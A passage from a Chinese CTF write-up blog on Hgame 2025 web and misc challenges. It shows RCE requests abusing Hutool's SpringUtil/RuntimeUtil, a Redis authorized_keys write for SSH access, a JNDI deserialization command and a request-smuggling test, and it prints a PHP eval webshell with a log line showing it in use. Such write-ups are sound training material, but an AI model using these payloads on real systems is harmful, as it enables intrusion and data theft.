class="hljs-operator">=</span> cmd.charAt(i);<br>            <span class="hljs-keyword">switch</span> (c) &#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27; &#x27;</span>:<br>                    <span class="hljs-keyword">if</span> (inWrap) &#123;<br>                        cache.append(c);<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        cmds.add(cache.toString());<br>                        cache.reset();<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\&quot;&#x27;</span>:<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\&#x27;&#x27;</span>:<br>                    <span class="hljs-keyword">if</span> (inWrap) &#123;<br>                        <span class="hljs-keyword">if</span> (c == stack.peek().charValue()) &#123;<br>                            stack.pop();<br>                            inWrap = <span class="hljs-literal">false</span>;<br>                        &#125;<br>                        cache.append(c);<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        stack.push(Character.valueOf(c));<br>                        cache.append(c);<br>                        inWrap = <span class="hljs-literal">true</span>;<br>                        <span class="hljs-keyword">break</span>;<br>                    &#125;<br>                <span class="hljs-keyword">default</span>:<br>                    cache.append(c);<br>                    <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (cache.hasContent()) &#123;<br>            cmds.add(cache.toString());<br>        &#125;<br>        <span class="hljs-keyword">return</span> (String[]) cmds.toArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /api/gateway HTTP/1.1<br>Host: node1.hgame.vidar.club:31791<br>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br>Cache-Control: max-age=0<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate<br>Content-Type: application/json<br><br>&#123;<span class="hljs-string">&quot;beanName&quot;</span>:<span class="hljs-string">&quot;cn.hutool.extra.spring.SpringUtil&quot;</span>,<span class="hljs-string">&quot;methodName&quot;</span>:<span class="hljs-string">&quot;registerBean&quot;</span>,<span class="hljs-string">&quot;params&quot;</span>:&#123;<span class="hljs-string">&quot;arg0&quot;</span>:<span class="hljs-string">&quot;shell&quot;</span>,<span class="hljs-string">&quot;arg1&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;cn.hutool.core.util.RuntimeUtil&quot;</span>&#125;&#125;&#125;<br></code></pre></td></tr></table></figure>
+<p><img src="/../../images/Hgame/2025-02-22193119.png" srcset="/img/loading.gif" lazyload alt="2025-02-22193119"></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;beanName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;shell&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;methodName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;execForStr&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;params&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;arg0&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;utf8&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;arg1&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;whoami&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /api/gateway HTTP/1.1<br>Host: node1.hgame.vidar.club:31791<br>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br>Cache-Control: max-age=0<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Accept-Encoding: gzip, deflate<br>Content-Type: application/json<br><br>&#123;<span class="hljs-string">&quot;beanName&quot;</span>:<span class="hljs-string">&quot;shell&quot;</span>,<span class="hljs-string">&quot;methodName&quot;</span>:<span class="hljs-string">&quot;execForStr&quot;</span>,<span class="hljs-string">&quot;params&quot;</span>:&#123;<span class="hljs-string">&quot;arg0&quot;</span>:<span class="hljs-string">&quot;utf8&quot;</span>,<span class="hljs-string">&quot;arg1&quot;</span>:[<span class="hljs-string">&quot;/readflag&quot;</span>]&#125;&#125;<br></code></pre></td></tr></table></figure>
+<p><img src="/../../images/Hgame/2025-02-22193559.png" srcset="/img/loading.gif" lazyload alt="2025-02-22193559"></p>
+<h3 id="level-257-日落的紫罗兰"><a class="markdownIt-Anchor" href="#level-257-日落的紫罗兰"></a> Level 257 日落的紫罗兰</h3>
+<p>nmap可以扫一下这两个端口，一个是ssh，一个是redis,redis无密码</p>
+<p>首先的思路是对ssh进行爆破，利用hydra利用字典看看能不能爆出来，没有成功。</p>
+<p>尝试之后ssh连接不了，redis里面没东西，题目给了user.txt，可以尝试写个id_rsa上去</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"> ssh-keygen -t rsa<br>(<span class="hljs-built_in">echo</span> -e “\n\n”; <span class="hljs-built_in">cat</span> ./id_rsa.pub; <span class="hljs-built_in">echo</span> -e “\n\n”) &gt; spaced_key.txt<br> <span class="hljs-built_in">cat</span> spaced_key.txt |redis-cli -h node1.hgame.vidar.club -p 30877 -x <span class="hljs-built_in">set</span> ssh_key <span class="hljs-comment">#将 SSH 公钥存储到 Redis 的 ssh_key 键下。</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">![2025-02-22203924](../../images/Hgame/2025-02-22203924.png)└─$ redis-cli  -h node1.hgame.vidar.club -p 30877<br>node1.hgame.vidar.club:30877&gt;  config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /home/mysid/.ssh<br>OK<br>node1.hgame.vidar.club:30877&gt; config <span class="hljs-built_in">set</span> dbfilename <span class="hljs-string">&quot;authorized_keys&quot;</span><br>OK<br>node1.hgame.vidar.club:30877&gt; save<br>OK<br>node1.hgame.vidar.club:30877&gt; <span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure>
+<p>将 Redis 数据存储在 <code>authorized_keys</code> 文件中，了利用 Redis 来管理 SSH 公钥，从而实现远程身份验证。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh -i id_rsa mysid@node1.hgame.vidar.club -p 30156<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">scp -i ./id_rsa -P 30156 /JNDIMap-0.0.1.jar mysid@node1.hgame.vidar.club:/tmp<br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/local/openjdk-8/bin/java -jar /tmp/JNDIMap-0.0.1.jar -i 127.0.0.1 -l 389 -u <span class="hljs-string">&quot;/Deserialize/Jackson/Command/Y2htb2QgNzc3IC9mbGFn&quot;</span><br></code></pre></td></tr></table></figure>
+<p>再开个窗口先ssh</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X POST -d <span class="hljs-string">&quot;baseDN=a/b&amp;filter=a&quot;</span> http://127.0.0.1:8080/search<br></code></pre></td></tr></table></figure>
+<p>最后就可以cat /flag了(：</p>
+<p><img src="/../../images/Hgame/2025-02-22203924.png" srcset="/img/loading.gif" lazyload alt="2025-02-22203924"></p>
+<h3 id="level-111-不存在的车厢"><a class="markdownIt-Anchor" href="#level-111-不存在的车厢"></a> Level 111 不存在的车厢</h3>
+<p>长度字段使用 uint16（2字节），限制单个字段最大为 65535 字节，所以当⼀个⼤于uint16最⼤值的Length被序列化时会 产⽣整数溢出，改变序列化后的语义  H111协议存在pipeline以及连接复⽤，前⾯搁置的部分数据会被按照第⼆个 请求解析并响应，在外部第⼆个请求打到proxy的时候，有⼀定概率复⽤同个连接并⾛私出这⼀部分 response</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">TestGenRequest</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>    <span class="hljs-comment">// 创建一个包含完整信息的测试请求</span><br>    testReq := &amp;http.Request&#123;<br>        Method:     <span class="hljs-string">&quot;POST&quot;</span>,<br>        RequestURI: <span class="hljs-string">&quot;/flag&quot;</span>,<br>        Header: <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>][]<span class="hljs-type">string</span>&#123;<br>            <span class="hljs-string">&quot;Content-Type&quot;</span>: &#123;<span class="hljs-string">&quot;application/json&quot;</span>&#125;,<br>            <span class="hljs-string">&quot;User-Agent&quot;</span>:   &#123;<span class="hljs-string">&quot;test-client&quot;</span>&#125;,<br>        &#125;,<br>        Body: io.NopCloser(strings.NewReader(<span class="hljs-string">&quot;test body&quot;</span>)),<br>    &#125;<br><br>    <span class="hljs-comment">// 序列化请求</span><br>    <span class="hljs-keyword">var</span> buf bytes.Buffer<br>    err := WriteH111Request(&amp;buf, testReq)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>        t.Fatalf(<span class="hljs-string">&quot;expected no error, got %v&quot;</span>, err)<br>    &#125;<br><br>    <span class="hljs-comment">// 打印序列化后的二进制数据长度和十六进制表示</span><br>    t.Logf(<span class="hljs-string">&quot;Serialized length: %d bytes&quot;</span>, <span class="hljs-built_in">len</span>(buf.Bytes()))<br>    t.Logf(<span class="hljs-string">&quot;Hex dump: %s&quot;</span>, hex.EncodeToString(buf.Bytes()))<br></code></pre></td></tr></table></figure>
+<p>放在protocol/request_test.go，通过gotest-v拿到输出</p>
+<p>最后放yakit里</p>
+<p><img src="/../../images/Hgame/2025-02-22211012.png" srcset="/img/loading.gif" lazyload alt="2025-02-22211012"></p>
+<h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1>
+<h3 id="computer-cleaner"><a class="markdownIt-Anchor" href="#computer-cleaner"></a> Computer cleaner</h3>
+<p>正常导入vm</p>
+<p>搜索危险函数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep -rn <span class="hljs-string">&quot;eval(&quot;</span> /var/www/html<br>/var/www/html/uploads/shell.php:1:&lt;?php @<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;hgame&#123;y0u_&#x27;</span>]);?&gt;<br></code></pre></td></tr></table></figure>
+<p>然后看/var/log里面的日志</p>
+<p>有一天是<code>121.41.34.25</code>访问得到第二部分flag</p>
+<p>第三部分也是看日志</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.41.34.25 - - [17/Jan/2025:12:02:05 +0000] <span class="hljs-string">&quot;GET /uploads/shell.php?cmd=cat%20~/Documents/flag_part3 HTTP/1.1&quot;</span> 200 2048 <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36&quot;</span><br>vidar@vidar-computer:/var/www/html$ <span class="hljs-built_in">cat</span> ~/Documents/flag_part3<br>_c0mput3r!&#125;<br></code></pre></td></tr></table></figure>
+<p>最后得到</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">hgame</span><span class="hljs-template-variable">&#123;y0u_hav3_cleaned_th3_c0mput3r!&#125;</span><br></code></pre></td></tr></table></figure>
+<h3 id="computer-cleaner-plus"><a class="markdownIt-Anchor" href="#computer-cleaner-plus"></a> Computer cleaner plus</h3>
+<p>进行ps发现denied，查看一下发现后门</p>
+<p><img src="/../../images/Hgame/2025-02-22140449.png" srcset="/img/loading.gif" lazyload alt="2025-02-22140449"></p>
+<p><code>hgame&#123;B4ck_D0_oR&#125;</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctf/" class="print-no-link">#ctf</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Hgame2025-web</div>
+      <div>https://0ran9ewww.github.io/2025/02/22/Hgame/Hgame2025/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>orange</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年2月22日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年2月22日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/02/16/%E5%9B%BD%E9%99%85%E8%B5%9B/BroncoCTF%202025/" title="BroncoCTF 2025-web">
+                        <span class="hidden-mobile">BroncoCTF 2025-web</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> <p>本 blog 由 dkdun 支持</p> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+ 
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/DynamicLine.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
+
+<!--浏览器搞笑标题-->
+<script type="text/javascript" src="\js\FunnyTitle.js"></script>
+<!--鼠标点击礼花特效-->
+<script async src="/js/fireworks.js"></script>
